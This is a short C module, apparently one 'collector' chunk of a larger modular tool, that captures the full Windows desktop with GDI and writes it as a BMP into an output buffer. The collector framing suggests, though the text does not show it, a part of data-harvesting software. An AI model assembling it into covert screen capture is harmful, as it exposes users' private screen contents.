// chunk: collectors/screenshot_v2
// depends: core/emit_buffer
// provides: collect_screenshot
// libs: gdi32

#ifndef CHUNK_SCREENSHOT_V2
#define CHUNK_SCREENSHOT_V2

static void collect_screenshot(void) {
    int cx = GetSystemMetrics(SM_CXSCREEN);
    int cy = GetSystemMetrics(SM_CYSCREEN);
    if (cx <= 0 || cy <= 0) return;

    HDC hdcScreen = GetDC(NULL);
    if (!hdcScreen) return;
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    if (!hdcMem) { ReleaseDC(NULL, hdcScreen); return; }

    BITMAPINFO bmi;
    ZeroMemory(&bmi, sizeof(bmi));
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = cx;
    bmi.bmiHeader.biHeight = -cy;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 24;
    bmi.bmiHeader.biCompression = BI_RGB;

    void *bits = NULL;
    HBITMAP hDib = CreateDIBSection(hdcMem, &bmi, DIB_RGB_COLORS, &bits, NULL, 0);
    if (!hDib || !bits) {
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return;
    }

    HGDIOBJ old = SelectObject(hdcMem, hDib);
    BitBlt(hdcMem, 0, 0, cx, cy, hdcScreen, 0, 0, SRCCOPY);
    SelectObject(hdcMem, old);

    DWORD stride = ((cx * 3 + 3) & ~3);
    DWORD pixel_sz = stride * (DWORD)cy;

    BYTE *px = (BYTE *)bits;
    int blank = 1;
    for (DWORD off = 0; off < pixel_sz && blank; off += stride) {
        for (int x = 0; x < cx * 3 && blank; x++) {
            if (px[off + x] != 0) blank = 0;
        }
    }

    if (!blank) {
        BITMAPFILEHEADER fh;
        ZeroMemory(&fh, sizeof(fh));
        fh.bfType = 0x4D42;
        fh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
        fh.bfSize = fh.bfOffBits + pixel_sz;

        emitf("=== SCREENSHOT ===\r\n");
        emitf("  %dx%d BMP (%lu bytes)\r\n", cx, cy, fh.bfSize);
        emit((const char *)&fh, sizeof(fh));
        emit((const char *)&bmi.bmiHeader, sizeof(BITMAPINFOHEADER));
        emit((const char *)px, pixel_sz);
        emitf("\r\n");
    } else {
        emitf("=== SCREENSHOT ===\r\n");
        emitf("  (skipped: no desktop session)\r\n");
    }

    DeleteObject(hDib);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
}

#endif
